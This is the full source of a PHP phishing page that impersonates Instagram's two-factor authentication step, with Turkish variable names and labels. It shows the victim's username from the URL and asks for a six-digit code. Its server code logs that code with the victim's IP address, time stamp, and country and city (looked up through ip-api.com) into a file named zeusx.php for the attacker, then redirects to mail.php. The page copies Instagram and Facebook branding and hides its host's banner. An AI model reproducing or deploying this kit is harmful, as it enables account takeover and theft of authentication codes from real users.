<?php
$lparalyzed=$_GET['nick'];
if ($_POST) {

	
	$lparalyzed=$_GET["nick"];
	$code=$_POST["code"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('zeusx.php', 'a');
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='red'>Kullanıcı Adı:</font><font color='white'>".$lparalyzed."</font><br>
<font color='red'>Kod: </font><font color='white'>".$code."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>
<br>

"); 
fclose($file);


   header("Location: mail.php");
}
?>

<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css"><style>img[alt="www.000webhost.com"]{display:none;}</style>
	<title>Login • lnstagram</title>
	<link rel="icon" sizes="192x192" href="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTp5Ex2kch6H9Ybcq6A0dxj70ciW8E5DOH7lg&usqp=CAU">
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
</head>
<body style="background:#fafafa;">
	<header>
	<div style="margin:0; padding;">

 
<div style=" padding:5px; margin:0px;
width:99%; height:45px;;
  background: #f09433; 
background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
  ">


  <table style="width:100%;margin:0px;">
      <tbody><tr style="width:100%;margin:0px;">
         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">Instagram</td>
         <td style="border:1px solid:white;color:white; margin:0px;
text-align:right;"><div style="border:1px solid white;margin:0px;
width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;">GET
</div>

</td>
      </tr>
      <tr>
         <td style=" font-family:sans-serif;font-weight:400;color:white;font-size:13px;">Find It for free on Google Play.</td>
         <td>    </td>
      </tr>
   </tbody></table>



</div>
</div>
</header>
	<center>
		<br><br>
		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>
				</th>
				<th class="can"><span class="or">OR</span></th>
				<th class="han">
			<div class="top"></div>
				</th>
			</tr>
		</table>
<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			<br>
<img src="https://i.hizliresim.com/DYpNSD.png" width="110">
</span></span><br><br><p style="font-family:sans-serif;width:95%;max-width:95%;color:#999;font-size:15px;line-height:19px;box-sizing:border-box;">
Enter a 2-factor authentication code to verify that you own the account.
			</p><br><form method="post">
				<input type="number" name="code" id="code" placeholder="Enter the 6-digit code" required="" class="code" style="width:250px;height:28px;padding-left:6px;padding-top:2px;padding-bottom:2px;outline:none;background:#fafafa;border:none;border:1px solid #dedede" onkeyup="form_kontrol()" ><br><br>
		
			<button id="buton" type="submit" class="qenzyist" disabled><?php echo "Continue As @$lparalyzed "; ?></button>
			<br>
<p style="font-family:sans-serif;width:95%;max-width:95%;color:#999;font-size:15px;line-height:19px;box-sizing:border-box;">
If you can't get a security code, you can use one of your&nbsp;<span style="color: rgb(0, 149, 246);">backup codes.</span></p>

	
		
		</form>
<form action='mail.php'>
		    <button type='submit' class='qenzyist' style='width:240px;height:24px;'>No factors in my account
</button>

		</form>
<br>
			</div>






		<br>
		

	</center>
	<center>
	<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
				<p style="font-family:sans-serif;width:95%;max-width:95%;color:#999;font-size:15px;line-height:19px;box-sizing:border-box;">
Instagram From Facebook
© Instagram. Facebook Inc., 1601 Willow Road, Menlo Park, CA 94025
</p>

			</div></center>
	<?php
	for($i=0;$i<9;$i++){
echo "<br>";
	}
	?>
	<center>
	<div class="bottom">
		
		<span class="mini">from</span>
		<p class="big">FACEBOOK</p>
	</div>
</center>

</body>
</html>
<script>
    function form_kontrol()
{
    if(document.getElementById("code").value.length == 0)
        document.getElementById("buton").disabled = true;
    else 
        document.getElementById("buton").disabled = false;
}
</script>